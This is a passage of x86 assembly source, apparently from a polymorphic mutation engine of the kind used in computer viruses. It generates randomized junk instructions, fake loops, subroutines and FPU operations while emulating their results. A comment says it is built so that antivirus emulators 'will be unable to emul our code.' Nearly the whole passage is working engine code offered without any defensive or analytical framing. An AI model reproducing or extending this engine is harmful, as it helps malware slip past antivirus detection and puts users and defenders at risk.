                        dec     eax             ; movzx/movsx
                        jz      @@movsxzx
                        dec     eax             ; push reg/pop
                        jz      @@pushrp
                        dec     eax             ; push imm/pop
                        jz      @@puship

                        dec     eax
                        jz      @@x_mul
                        dec     eax
                        jz      @@x_imul
                        dec     eax
                        jz      @@x_div
                        dec     eax
                        jz      @@x_idiv

                        dec     eax
                        jz      @@x_fpu

                        ; new commands that dont need 2 dif. regs

                        dec     eax
                        jz      @@cmp_i_follow
                        dec     eax
                        jz      @@cmp_i_nofollow

                        dec     eax
                        jz      @@callsub

                        dec     eax
                        jz      @@subroutine

                        dec     eax
                        jz      @@x_bsr
                        dec     eax
                        jz      @@x_bsf

                        ; add other commands if only different regs selected
                        cmp     REG1, REG2      ; r1 == r2 ?
                        je      @@poly_cmd_restart

                        dec     eax
                        jz      @@x_xchg

                        dec     eax
                        jz      @@x_mov
                        dec     eax
                        jz      @@x_and
                        dec     eax
                        jz      @@x_or

                        dec     eax             ; r1, r2, c
                        jz      @@x_shld
                        dec     eax             ; r1, r2, c
                        jz      @@x_shrd

                        dec     eax             ; r1, r2
                        jz      @@x_xadd

                        dec     eax
                        jz      @@cmp_r_nofollow
                        dec     eax
                        jz      @@cmp_r_follow

                        dec     eax
                        jz      @@x_cycle

                        int 3   ; shouldn't be executed. fix # of items

@@poly_cmd_exit:        ; exit
                        mov     [esp+0*4], edi          ; pushad_edi
                        popa
                        retn

; --------------------- cycle -----------------------------------------------

@@x_cycle:
                        testcmd2 CMD2_CYCLE, @@poly_cmd_restart

                        push    cmdavail
                        push    cmdavail2
                        and     cmdavail, not (CMD_DIV+CMD_IDIV)
                        and     cmdavail2, not (CMD2_CYCLE+CMD2_SUBROUTINE+\
                                                CMD2_IFOLLOW+CMD2_INOFOLLOW+\
                                                CMD2_RFOLLOW+CMD2_RNOFOLLOW)
                        bts     regused, REG1         ;mark cycle register as used

                        push    edi             ; start-cycle: eip
                        call    @@eip

                        call    @@garbage_10

                        call    rnd_zf
                        jz      @@gen_sub

@@gen_add:              mov     ax, 0C081h      ; add reg, param
                        or      ah, REG1_8
                        stosw
                        mov     eax, XXX
                        stosd

                        jmp     @@gen_done

@@gen_sub:              mov     ax, 0E881h      ; sub reg, param
                        or      ah, REG1_8
                        stosw
                        mov     eax, XXX
                        stosd

                        neg     XXX             ; 4emul: add->sub
@@gen_done:
                        ; calc # of cycle iterations
                        mov     eax, 666*100
                        call    rnd_eax
                        inc     eax

@@em_add:               add     em_reg[REG1*4], XXX ; calc resulting value
                        dec     eax
                        jnz     @@em_add

                        call    @@eip

                        call    @@garbage_10

                        mov     ax, 0F881h      ; cmp r,result
                        or      ah, REG1_8
                        stosw
                        mov     eax, em_reg[REG1*4]
                        stosd

                        call    @@eip

                        pop     ecx             ; start-cycle: eip

                        lea     eax, [edi+2]
                        sub     eax, ecx
                        neg     eax

                        cmp     eax, 127
                        jg      @@j_long
                        cmp     eax, -128
                        jl      @@j_long

@@j_short:              call    rnd_zf
                        jz      @@j_long

                        mov     ah, al
                        mov     al, 75h
                        stosw

                        jmp     @@temptemp

@@j_long:               mov     ax, 850Fh       ; jne
                        stosw
                        stosd
                        sub     ecx, edi
                        mov     [edi-4], ecx
@@temptemp:

                        pop     cmdavail2
                        pop     cmdavail
                        mov     eax, regused         ; mark all free regs as uninit
                        and     reginit, eax         ; (value unknown)
                        btr     regused, REG1        ; mark cycle register as free

                        jmp     @@poly_cmd_exit

; --------------------- call subroutine -------------------------------------

@@callsub:              testcmd2 CMD2_SUBROUTINE, @@poly_cmd_restart

                        cmp     p_count, 0      ; no subs were generated yet?
                        je      @@poly_cmd_exit     ; !

                        cmp     in_subroutine, 0 ; do not make recurse calls
                        jne     @@poly_cmd_exit     ; !

; select random sub; get addr & stack size
                        mov     eax, p_count
                        call    rnd_eax
                        xchg    esi, eax
                        mov     ebx, p_addr[esi*4]
                        movzx   ecx, p_stack[esi]

; push params
                        jecxz   @@skip_push_rnd

@@push_rnd:             call    @@eip

                        call    rnd_8
                        add     al, 50h
                        stosb

                        loop    @@push_rnd
@@skip_push_rnd:

; generate call
                        call    @@eip

                        mov     al, 0E8h
                        stosb
                        stosd
                        sub     ebx, edi
                        mov     [edi-4], ebx

                        movzx   ecx, p_conv[esi]
                        jecxz   @@skip_fixstk           ; 0=pascal

                        movzx   ecx, p_stack[esi]
                        jecxz   @@skip_fixstk

                        mov     ax, 0C483h      ; add esp, nn
                        stosw
                        lea     eax, [ecx*4]
                        stosb

                        call    rnd_zf
                        jz      @@skip_fixstk
                        mov     byte ptr [edi-2], 0ECh ; add-->sub
                        neg     byte ptr [edi-1]       ; -nn
@@skip_fixstk:
                        jmp     @@poly_cmd_exit

; --------------------- generate subroutine ---------------------------------

@@subroutine:           testcmd2 CMD2_SUBROUTINE, @@poly_cmd_restart

                        cmp     p_count, C_MAX_SUB ; fixed # of subroutines
                        jae     @@poly_cmd_exit    ; !

                        inc     in_subroutine ; we're inside of subroutine(s)

; now, push all the state related to output code flow generation

                        flagsnz FLAG_NOJMPS, @@s_no_jmps ; cant be called?

                        ; if jmps allowed, gen sub somewhere there
                        push    edi             ; current EIP
                        call    @@eip_do1 ; change EIP (requres FLAG_NOJMPS=0)

                        jmp     @@s_done

@@s_no_jmps:            mov     al, 0E9h        ; NOJMPS? bypass subroutine
                        stosb
                        stosd
                        push    edi             ; current EIP
@@s_done:

                        call    @@state_push

                        xor     ecx, ecx        ; ECX<--number of paramz
                        call    rnd_zf          ; have any params?
                        jnz     @@set0
                        mov     eax, 4          ; 1..4
                        call    rnd_eax
                        lea     ecx, [eax+1]
@@set0:
                        ; save addr(EDI) & params(CL)
                        mov     eax, p_count
                        inc     p_count
                        mov     p_addr[eax*4], edi
                        mov     p_stack[eax], cl

                        ; calling convention: cdecl=1, pascal=0
                        call    rnd_zf
                        sete    dl
                        mov     p_conv[eax], dl

                        dec     dl              ; cdecl=0, pascal=-1
                        and     cl, dl          ; if (cdecl) pop_params=0

                        shl     ecx, 2
                        push    ecx             ; params size, in BYTEs

; reinitialize the state

; reduce set of registers available
@@rnd_again:            call    rnd_byte
                        and     eax, regavail
                        jz      @@rnd_again
                        mov     regavail, eax

                        mov     reginit, 0      ; all register values unknow
                        mov     regused, 0       ; ('coz multiple calls)

; prolog
                        mov     ebx, regavail
@@push_loop:            bsf     eax, ebx        ; smart idea
                        jz      @@push_done
                        btr     ebx, eax
                        call    @@eip
                        add     al, 50h
                        stosb
                        jmp     @@push_loop
@@push_done:

; body
                        mov     eax, 50
                        call    @@multi_garbage

                        call    @@eip
; epilog
                        mov     ebx, regavail       ; pop mask
@@pop_loop:             bsr     eax, ebx
                        jz      @@pop_done
                        btr     ebx, eax
                        call    @@eip
                        add     al, 58h              ;POP regs 1 at once
                        stosb
                        jmp     @@pop_loop
@@pop_done:

; retn
                        call    @@eip

                        mov     al, 0C3h
                        stosb

                        pop     ecx                  ; param frame size
                        jecxz   @@simpleret

                        dec     byte ptr [edi-1]     ; C3->C2
                        mov     eax, ecx             ; RET ? clean paramz
                        stosw
@@simpleret:

                        call    @@state_pop

; restore all the state
                        flagsnz FLAG_NOJMPS, @@e_no_jmps

                        pop     edi      ; 5 bytes (unrealized JMP) at EDI

                        jmp     @@e_done

@@e_no_jmps:            pop     ecx
                        mov     eax, edi
                        sub     eax, ecx
                        mov     [ecx-4], eax
@@e_done:
                        dec     in_subroutine

                        jmp     @@poly_cmd_exit

; --------------------- misc ------------------------------------------------

@@state_push:           pop     esi

                        push    regavail

                        lea     eax, state_begin
                        lea     ecx, state_end
@@push_cycle:           push    dword ptr [eax]
                        add     eax, 4
                        cmp     eax, ecx
                        jne     @@push_cycle

                        jmp     esi

@@state_pop:            pop     esi

                        lea     eax, state_begin
                        lea     ecx, state_end
@@pop_cycle:            sub     ecx, 4
                        pop     dword ptr [ecx]
                        cmp     ecx, eax
                        jne     @@pop_cycle

                        pop     regavail

                        jmp     esi

; --------------------- movsxzx ---------------------------------------------

@@movsxzx:              testcmd CMD_MOVSXZX, @@poly_cmd_restart

                        cmp     REG2, 4
                        jae     @@poly_cmd_exit

                        mov     ecx, em_reg[REG2*4]

                        call    rnd_zf
                        jz      @@use_xl

                        mov     cl, ch       ;use high 8 bits (AH,BH,...)
                        or      REG2_8, 4
@@use_xl:
                        call    rnd_zf
                        jz      @@movsx

@@movzx:                mov     ax, 0B60Fh           ;movzx
                        movzx   ecx, cl

                        jmp     @@stos_sxzx

@@movsx:                mov     ax, 0BE0Fh           ;movsx
                        movsx   ecx, cl

@@stos_sxzx:
                        mov     em_reg[REG1*4], ecx

                        stosw

                        xchg    REG1, REG2
                        call    @@modrm

                        jmp     @@poly_cmd_exit

; --------------------- push reg ; poly_cmd() ; pop_reg----------------------

@@pushrp:               testcmd2 CMD2_PUSHPOPR, @@poly_cmd_restart

                        mov     ecx, em_reg[REG2*4]
                        lea     eax, [REG2+50h]
                        stosb                    ; push reg

                        jmp     @@pop

@@puship:               testcmd2 CMD2_PUSHPOPC, @@poly_cmd_restart

                        call    rnd_zf
                        jz      @@imm_d

@@imm_b:                mov     ah, cl
                        movsx   ecx, ah
                        mov     al, 6Ah              ; push byte
                        stosw

                        jmp     @@pop

@@imm_d:                mov     al, 68h
                        stosb                        ; push dword
                        mov     eax, ecx
                        stosd

@@pop:
                        bts     regused, REG1    ;v5.50 bugfix
                        call    @@poly_cmd
                        btr     regused, REG1    ;v5.50 bugfix

                        call    @@eip
                        lea     eax, [REG1+58h]
                        stosb                    ;pop reg
                        mov     em_reg[REG1*4], ecx

                        jmp     @@poly_cmd_exit

; --------------------- cmp r, r/c ; jxx ------------------------------------

@@cmp_i_follow:         flagsnz FLAG_NOJMPS, @@poly_cmd_exit

                        testcmd2 CMD2_IFOLLOW, @@poly_cmd_exit

                        mov     tempo, -1

                        jmp     @@cmp_i

@@cmp_i_nofollow:       testcmd2 CMD2_INOFOLLOW, @@poly_cmd_exit

                        mov     tempo, 0

@@cmp_i:
                        test    REG1, REG1
                        jnz     @@longcmp
                        flagsnz FLAG_NOSHORT, @@longcmp ; if skip short opcs

                        mov     al, 3Dh              ; short form for eax
                        stosb

                        jmp     @@cmpeaxboth

@@longcmp:              mov     ax, 0F881h           ; CMP
                        or      ah, REG1_8
                        stosw

@@cmpeaxboth:           call    rnd_zf

                        mov     eax, em_reg[REG1*4]  ;Z
                        jz      @@useit
                        mov     eax, XXX        ; ecx

                        flagsnz FLAG_NOSHORT_C, @@useit
                        call    rnd_zf
                        jnz     @@useit

                        dec     edi                     ;
                        cmp     byte ptr [edi], 3Dh     ; EAX ?
                        je      @@longcmp               ;
                        inc     edi                     ;

                        mov     byte ptr [edi-2], 83h   ; 81->83, short form
                        movsx   eax, al  ; to pass EAX to @@outcond
                        stosb

                        jmp     @@outcond

@@useit:                stosd
                        jmp     @@outcond

@@cmp_r_follow:         flagsnz FLAG_NOJMPS, @@poly_cmd_exit

                        testcmd2 CMD2_RFOLLOW, @@poly_cmd_exit

                        mov     tempo, -1

                        jmp     @@cmp_r

@@cmp_r_nofollow:       testcmd2 CMD2_RNOFOLLOW, @@poly_cmd_exit

                        mov     tempo, 0

@@cmp_r:
                        push    REG1 REG2       ; 'coz of @@swap

                        mov     al, 39h         ; cmp r,r
                        call    @@swap
                        stosb
                        call    @@modrm

                        pop     REG2 REG1

                        mov     eax, em_reg[REG2*4]

@@outcond:
                        call    @@eip

                        cmp     em_reg[REG1*4], eax

                        seto    jxxcond[0]
                        setb    jxxcond[2]
                        sete    jxxcond[4]
                        setbe   jxxcond[6]
                        sets    jxxcond[8]
                        setp    jxxcond[10]
                        setl    jxxcond[12]
                        setle   jxxcond[14]

                        call    rnd_8
                        shl     eax, 1
                        xor     al, jxxcond[eax]
                        xor     al, 70h

                        mov     ecx, tempo
                        jecxz   @@dont_follow

                        xor     al, 0F1h ; invert condition + short2near
                        mov     ah, 0Fh  ;
                        xchg    al, ah
                        mov     ebx, edi
                        inc     edi      ; +1
                        call    @@eip_do1
                        mov     word ptr [ebx], ax         ;convert to jcc

                        jmp     @@poly_cmd_exit

@@dont_follow:          call    rnd_zf
                        jz      @@long_dontfollow

@@short_dontfollow:     stosb
                        call    rnd_byte
                        stosb                    ;displacement(that dont get exec)

                        jmp     @@poly_cmd_exit

@@long_dontfollow:      xor     al, 0F0h
                        mov     ah, 0Fh
                        xchg    al, ah
                        stosw
                        call    rnd_dword
                        stosd

                        jmp     @@poly_cmd_exit

; --------------------- common subroutines ----------------------------------

; input: EAX=opcode, REG1,REG2

@@swap:                 flagsnz FLAG_NOSWAP, @@swap_retn
                        call    rnd_zf
                        jz      @@swap_retn
                        xor     al, 2           ; bit 'S', means swap regs
                        xchg    REG1, REG2      ; so, the same action
@@swap_retn:            retn

@@oralR1_stosb:         or      al, REG1_8
                        stosb
                        jmp     @@poly_cmd_exit

@@orahR1_stosw:         or      ah, REG1_8
                        stosw
                        jmp     @@poly_cmd_exit

@@swap_stosb_modrm:     call    @@swap
                        jmp     @@stosb_modrm

@@stosw_modrm:          stosb
                        mov     al, ah
@@stosb_modrm:          stosb
                        call    @@modrm
                        jmp     @@poly_cmd_exit

@@modrm:                pusha
                        mov     al, 0C0h
                        shl     REG2_8, 3
                        or      al, REG2_8
                        or      al, REG1_8
                        stosb
                        popa
                        inc     edi
                        retn

@@stosw_modrm_stosbX:   stosw
                        call    @@modrm
                        jmp     @@stosbX

@@stosb_modrm_stosd:    stosb
                        call    @@modrm
                        jmp     @@stosd

@@oralR1_stosb_stosd:   or      al, REG1_8
@@stosb_stosd:          stosb
@@stosd:                xchg    eax, XXX
                        stosd
                        jmp     @@poly_cmd_exit

@@orahR1_stosw_stosd:   or      ah, REG1_8
                        stosw
                        jmp     @@stosd

@@checkshort:           cmp     al, 83h
                        je      @@orahR1_stosw_stosbX

                        flagsnz FLAG_NOSHORT, @@orahR1_stosw_stosd
                        test    REG1, REG1
                        jnz     @@orahR1_stosw_stosd
                        shr     eax, 16
                        jmp     @@stosb_stosd

@@orahR1_stosw_stosbX:  or      ah, REG1_8
                        stosw
@@stosbX:               mov     al, XXX_8
                        stosb
                        jmp     @@poly_cmd_exit

@@modarg:               and     ecx, 31                 ; if (x==0) x++;
                        cmp     cl, 1
                        adc     cl, 0
                        retn

@@stos3or:              stosw
                        shr     eax, 16
                        or      al, REG1_8
                        mov     ah, XXX_8
                        stosw
                        jmp     @@poly_cmd_exit

; ---------------------------------------------------------------------------

@@x_not:                testcmd CMD_NOT, @@poly_cmd_restart
                        not     em_reg[REG1*4]          ; emul -- not r1
                        mov     ax, 0d0f7h              ; opcode
                        jmp     @@orahR1_stosw

@@x_neg:                testcmd CMD_NEG, @@poly_cmd_restart
                        neg     em_reg[REG1*4]          ; emul -- neg r1
                        mov     ax, 0d8f7h              ; opcode
                        jmp     @@orahR1_stosw

@@x_inc:                testcmd CMD_INC, @@poly_cmd_restart
                        inc     em_reg[REG1*4]          ; emul -- inc r1
                        mov     al, 40h                 ; opcode
                        jmp     @@oralR1_stosb

@@x_dec:                testcmd CMD_DEC, @@poly_cmd_restart
                        dec     em_reg[REG1*4]          ; emul -- dec r1
                        mov     al, 48h                 ; opcode
                        jmp     @@oralR1_stosb

@@x_shl:                testcmd CMD_SHL, @@poly_cmd_restart
                        shl     em_reg[REG1*4], 1       ; emul -- shl r1, 1
                        mov     ax, 0e0d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_shr:                testcmd CMD_SHR, @@poly_cmd_restart
                        shr     em_reg[REG1*4], 1       ; emul -- shr r1, 1
                        mov     ax, 0e8d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_rol:                testcmd CMD_ROL, @@poly_cmd_restart
                        rol     em_reg[REG1*4], 1       ; emul -- rol r1, 1
                        mov     ax, 0c0d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_ror:                testcmd CMD_ROR, @@poly_cmd_restart
                        ror     em_reg[REG1*4], 1       ; emul -- ror r1, 1
                        mov     ax, 0c8d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_sar:                testcmd CMD_SAR, @@poly_cmd_restart
                        sar     em_reg[REG1*4], 1       ; emul -- sar r1, 1
                        mov     ax, 0f8d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_xor:                testcmd CMD_XOR, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- xor r1, r2
                        xor     em_reg[REG1*4], eax
                        mov     al, 31h                 ; opcode
                        jmp     @@swap_stosb_modrm

@@x_add:                testcmd CMD_ADD, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- add r1, r2
                        add     em_reg[REG1*4], eax
                        mov     al, 01h                 ; opcode
                        jmp     @@swap_stosb_modrm

@@x_sub:                testcmd CMD_SUB, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- sub r1, r2
                        sub     em_reg[REG1*4], eax
                        mov     al, 29h                 ; opcode
                        jmp     @@swap_stosb_modrm

@@x_mov:                testcmd CMD_MOV, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- mov r1, r2
                        mov     em_reg[REG1*4], eax
                        mov     al, 89h                 ; opcode
                        jmp     @@swap_stosb_modrm

@@x_xchg:               testcmd CMD_XCHG, @@poly_cmd_restart
                        bt      regused, REG2
                        jc      @@poly_cmd_exit
                        mov     eax, em_reg[REG1*4]     ; emul -- xchg r1, r2
                        xchg    em_reg[REG2*4], eax
                        mov     em_reg[REG1*4], eax
                        mov     al, 87h                 ; opcode
                        jmp     @@stosb_modrm

@@x_and:                testcmd CMD_AND, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- and r1, r2
                        and     em_reg[REG1*4], eax
                        mov     al, 21h                 ; opcode
                        jmp     @@swap_stosb_modrm

@@x_or:                 testcmd CMD_OR, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- or r1, r2
                        or      em_reg[REG1*4], eax
                        mov     al, 09h                 ; opcode
                        jmp     @@swap_stosb_modrm

@@x_mov_c:              testcmd CMD_MOV, @@poly_cmd_restart
                        mov     em_reg[REG1*4], XXX     ; emul -- mov r1, c
                        mov     al, 0B8h                ; opcode
                        jmp     @@oralR1_stosb_stosd

@@x_add_c:              testcmd CMD_ADD, @@poly_cmd_restart
                        mov     eax, 05C081h
                        call    @@try_short
                        add     em_reg[REG1*4], XXX     ; emul -- add r1, c
                        jmp     @@checkshort

@@x_sub_c:              testcmd CMD_SUB, @@poly_cmd_restart
                        mov     eax, 2DE881h            ; opcode
                        call    @@try_short
                        sub     em_reg[REG1*4], XXX     ; emul -- sub r1, c
                        jmp     @@checkshort

@@x_xor_c:              testcmd CMD_XOR, @@poly_cmd_restart
                        mov     eax, 35F081h            ; opcode
                        call    @@try_short
                        xor     em_reg[REG1*4], XXX     ; emul -- xor r1, c
                        jmp     @@checkshort

@@x_and_c:              testcmd CMD_AND, @@poly_cmd_restart
                        mov     eax, 25E081h            ; opcode
                        call    @@try_short
                        and     em_reg[REG1*4], XXX     ; emul -- and r1, c
                        jmp     @@checkshort

@@x_or_c:               testcmd CMD_OR, @@poly_cmd_restart
                        mov     eax, 0DC881h            ; opcode
                        call    @@try_short
                        or      em_reg[REG1*4], XXX     ; emul -- or  r1, c
                        jmp     @@checkshort

@@try_short:            flagsnz FLAG_NOSHORT_C, @@try_short_retn
                        call    rnd_zf
                        jz      @@try_short_retn
                        or      al, 2                   ; 81->83
                        movsx   XXX, XXX_8
@@try_short_retn:       retn

@@x_rol_c:              testcmd CMD_ROL, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        rol     em_reg[REG1*4], cl      ; emul -- rol r1, c
                        mov     ax, 0C0C1h              ; opcode
                        jmp     @@orahR1_stosw_stosbX

@@x_ror_c:              testcmd CMD_ROR, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        ror     em_reg[REG1*4], cl      ; emul -- ror r1, c
                        mov     ax, 0C8C1h              ; opcode
                        jmp     @@orahR1_stosw_stosbX

@@x_imul_ex:            testcmd CMD_IMUL_EX, @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]     ; emul -- imul r1, r2
                        imul    eax, em_reg[REG2*4]
                        mov     em_reg[REG1*4], eax
                        mov     ax, 0AF0Fh              ; opcode
                        xchg    REG1, REG2
                        jmp     @@stosw_modrm

@@x_imul_ex_c:          testcmd CMD_IMUL_EX, @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- imul r1,r2,c
                        imul    eax, XXX
                        mov     em_reg[REG1*4], eax
                        mov     al, 69h                 ; opcode
                        xchg    REG1, REG2
                        jmp     @@stosb_modrm_stosd

@@x_shld:               testcmd CMD_SHLD, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        mov     eax, em_reg[REG2*4]     ; emul -- shld r1,r2,c
                        shld    em_reg[REG1*4], eax, cl
                        mov     ax, 0A40Fh              ; opcode
                        jmp     @@stosw_modrm_stosbX

@@x_shrd:               testcmd CMD_SHRD, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        mov     eax, em_reg[REG2*4]     ; emul -- shrd r1,r2,c
                        shrd    em_reg[REG1*4], eax, cl
                        mov     ax, 0AC0Fh              ; opcode
                        jmp     @@stosw_modrm_stosbX

@@x_btc_c:              testcmd CMD_BTC, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        btc     em_reg[REG1*4], XXX     ; emul -- btc r1, c
                        mov     eax, 0f8ba0fh           ; opcode
                        jmp     @@stos3or

@@x_btr_c:              testcmd CMD_BTR, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        btr     em_reg[REG1*4], XXX     ; emul -- btr r1, c
                        mov     eax, 0f0ba0fh           ; opcode
                        jmp     @@stos3or

@@x_bts_c:              testcmd CMD_BTS, @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        bts     em_reg[REG1*4], XXX     ; emul -- bts r1, c
                        mov     eax, 0e8ba0fh           ; opcode
                        jmp     @@stos3or

@@x_bswap:              testcmd CMD_BSWAP, @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]     ; emul -- bswap r1
                        bswap   eax
                        mov     em_reg[REG1*4], eax
                        mov     ax, 0c80fh              ; opcode
                        jmp     @@orahR1_stosw

@@x_xadd:               testcmd CMD_XADD, @@poly_cmd_restart
                        bt      regused, REG2
                        jc      @@poly_cmd_exit
                        mov     eax, em_reg[REG1*4]     ; emul -- xadd r1,r2
                        mov     ecx, em_reg[REG2*4]
                        xadd    eax, ecx
                        mov     em_reg[REG1*4], eax
                        mov     em_reg[REG2*4], ecx
                        mov     ax, 0C10Fh              ; opcode
                        jmp     @@stosw_modrm

@@x_bsr:                testcmd CMD_BSR, @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]
                        mov     ecx, em_reg[REG2*4]
                        bsr     eax, ecx
                        mov     em_reg[REG1*4], eax
                        mov     ax, 0BD0Fh
                        xchg    REG1, REG2
                        jmp     @@stosw_modrm

@@x_bsf:                testcmd CMD_BSF, @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]
                        mov     ecx, em_reg[REG2*4]
                        bsf     eax, ecx
                        mov     em_reg[REG1*4], eax
                        mov     ax, 0BC0Fh
                        xchg    REG1, REG2
                        jmp     @@stosw_modrm

@@md_init:              mov     eax, regavail
                        and     eax, REG_EAX+REG_EDX
                        cmp     eax, REG_EAX+REG_EDX
                        jne     @@md_sux
                        mov     eax, reginit
                        and     eax, REG_EAX+REG_EDX
                        cmp     eax, REG_EAX+REG_EDX
                        jne     @@md_sux
                        test    regused, REG_EAX+REG_EDX
                        jnz     @@md_sux
                        mov     eax, em_reg[REG_EAX_N*4]
                        mov     edx, em_reg[REG_EDX_N*4]
                        mov     ecx, em_reg[REG1*4]
                        retn
@@md_sux:               pop     eax     ; return address
                        jmp     @@poly_cmd_exit

@@md_done:              mov     em_reg[REG_EAX_N*4], eax
                        mov     em_reg[REG_EDX_N*4], edx
                        retn

@@x_mul:                testcmd CMD_MUL, @@poly_cmd_restart
                        call    @@md_init
                        mul     ecx
                        call    @@md_done
                        mov     ax, 0E0F7h
                        jmp     @@orahR1_stosw

@@x_imul:               testcmd CMD_IMUL, @@poly_cmd_restart
                        call    @@md_init
                        imul    ecx
                        call    @@md_done
                        mov     ax, 0E8F7h
                        jmp     @@orahR1_stosw

@@x_div:                testcmd CMD_DIV, @@poly_cmd_restart
                        call    @@md_init
                        ;; check if DIV avail
                        or      ecx, ecx
                        jz      @@poly_cmd_exit
                        cmp     ecx, edx
                        jbe     @@poly_cmd_exit
                        ;;
                        div     ecx
                        call    @@md_done
                        mov     eax, 0F0F7h
                        jmp     @@orahR1_stosw

@@x_idiv:               testcmd CMD_DIV, @@poly_cmd_restart
                        call    @@md_init
                        ;; check if IDIV avail X-)
                        call    @@can_idiv
                        jc      @@poly_cmd_exit
                        ;;
                        idiv    ecx
                        call    @@md_done
                        mov     eax, 0F8F7h
                        jmp     @@orahR1_stosw

; action: IDIV parameters checking (partial emulation, unsigned)
; input: EDX:EAX, ECX
; output: CF
; * all AV emulators performs only partial verification at this step,
; * and skips some good IDIVs. So, they will be unable to emul our code.

@@can_idiv:             pusha
                        or      ecx, ecx
                        stc                     ; 4.00:optimized
                        jz      @@idiv_err
                        jg      @@g1
                        neg     ecx
@@g1:                   or      edx, edx
                        jge     @@g2
                        neg     edx
                        neg     eax
                        sbb     edx, 0
@@g2:                   xor     esi, esi        ; d
                        xor     edi, edi        ; m
                        mov     bl, 64
@@divcycle:             shl     esi, 1          ; d <<= 1
                        jc      @@idiv_err
                        shl     eax, 1          ; x <<= 1
                        rcl     edx, 1
                        rcl     edi, 1          ; m = (m << 1) | x.bit[i]
                        jc      @@cmpsub
                        cmp     edi, ecx        ; if (m >= y)
                        jb      @@cmpsubok
@@cmpsub:               sbb     edi, ecx        ; m -= y
                        or      esi, 1          ; d |= 1
@@cmpsubok:             dec     bl
                        jnz     @@divcycle
                        shl     esi, 1
                        jc      @@idiv_err
                        shl     edi, 1
                    ;   jc      @@idiv_err      ; 4.00:optimized
                    ;   popa
                    ;   retn
@@idiv_err:         ;   stc
                        popa
                        retn

; ---------------------------------------------------------------------------

; real super-puper...

@@x_fpu:                testcmd2 CMD2_FPU, @@poly_cmd_restart

                        cmp     in_subroutine, 0  ; avoid FPU stack overflow
                        jne     @@poly_cmd_exit

                        cmp     fpustack, 8       ; max FPU stack
                        jae     @@poly_cmd_exit

                        cmp     fpuinit, 0
                        jne     @@alredyinit
                        inc     fpuinit

                        mov     ax, 0DB9Bh   ; finit (wait+fninit)
                        stosw
                        mov     al, 0E3h
                        stosb
                        finit
                        mov     fpustack, 0

                        jmp     @@poly_cmd_exit ; v5.50 bugfix
@@alredyinit:
                        bts     regused, REG1   ; v5.50 bugfix

                        lea     eax, [REG2+50h] ; push reg2
                        stosb
                        push    em_reg[REG2*4]

                        call    @@poly_cmd

                        call    @@do_fild       ; fld/fild dword ptr [esp]

                        xor     esi, esi        ; 1 arg

                        cmp     fpustack, 8     ; no more fpu stack avail?
                        jae     @@fpu_onearg

                        call    rnd_zf
                        jnz     @@fpu_twoarg
@@fpu_onearg:
                        call    rnd_3
;                       jz      @@fsin
                        dec     eax
                        jz      @@fcos
                        dec     eax
                        jz      @@fsqrt

@@fsin:                 mov     ax, 0FED9h
                        fsin
                        jmp     @@stosw_fpu_done

@@fcos:                 mov     ax, 0FFD9h
                        fcos
                        jmp     @@stosw_fpu_done

@@fsqrt:                mov     ax, 0FAD9h
                        fsqrt

@@stosw_fpu_done:       stosw

@@fpu_done:             call    @@poly_cmd

                        call    @@do_fist       ; fstp/fistp dword ptr [esp]

                        call    @@eip
                        lea     eax, [REG1+58h] ; pop reg1
                        stosb
                        pop     em_reg[REG1*4]

                        btr     regused, REG1   ; v5.50 bugfix

                        or      esi, esi
                        jz      @@was1

                        call    @@poly_cmd
                        call    @@eip
                        mov     ax, 0C483h      ; add esp, 4
                        stosw
                        mov     al, 4
                        stosb
                        add     esp, 4
@@was1:
                        jmp     @@poly_cmd_exit

@@fpu_twoarg:           inc     esi             ; 2 args

                        lea     eax, [REG1+50h] ; push reg1
                        stosb
                        push    em_reg[REG1*4]

                        call    @@poly_cmd

                        call    @@do_fild       ; fld/fild dword ptr [esp]

                        mov     eax, 6
                        call    rnd_eax
;                       jz      @@fadd
                        dec     eax
                        jz      @@fsub
                        dec     eax
                        jz      @@fsubr
                        dec     eax
                        jz      @@fmul
                        dec     eax
                        jz      @@fdiv
                        dec     eax
                        jz      @@fdivr

@@fadd:                 mov     ax, 0C1DEh
                        fadd
@@dfs_stosw_fpu_done:
                        dec     fpustack
                        jmp     @@stosw_fpu_done

@@fsub:                 mov     ax, 0E9DEh
                        fsub
                        jmp     @@dfs_stosw_fpu_done

@@fsubr:                mov     ax, 0E1DEh
                        fsubr
                        jmp     @@dfs_stosw_fpu_done

@@fmul:                 mov     ax, 0C9DEh
                        fmul
                        jmp     @@dfs_stosw_fpu_done

@@fdiv:                 mov     ax, 0F9DEh
                        fdiv
                        jmp     @@dfs_stosw_fpu_done

@@fdivr:                mov     ax, 0F1DEh
                        fdivr
                        jmp     @@dfs_stosw_fpu_done

@@do_fild:              call    @@eip
                        call    rnd_zf
                        jz      @@fld
@@fild:                 mov     ax, 04DBh          ; fild dword ptr [esp]
                        fild    dword ptr [esp+4]
                        jmp     @@x1
@@fld:                  mov     ax, 04D9h          ; fld dword ptr [esp]
                        fld     dword ptr [esp+4]
@@x1:                   stosw
                        mov     al, 24h
                        stosb
                        inc     fpustack
                        call    @@poly_cmd
                        retn

@@do_fist:              call    @@eip
                        call    rnd_zf
                        jz      @@fist
@@fst:                  mov     ax, 1CD9h    ; fstp dword ptr [esp]
                        fstp    dword ptr [esp+4]
                        jmp     @@x2
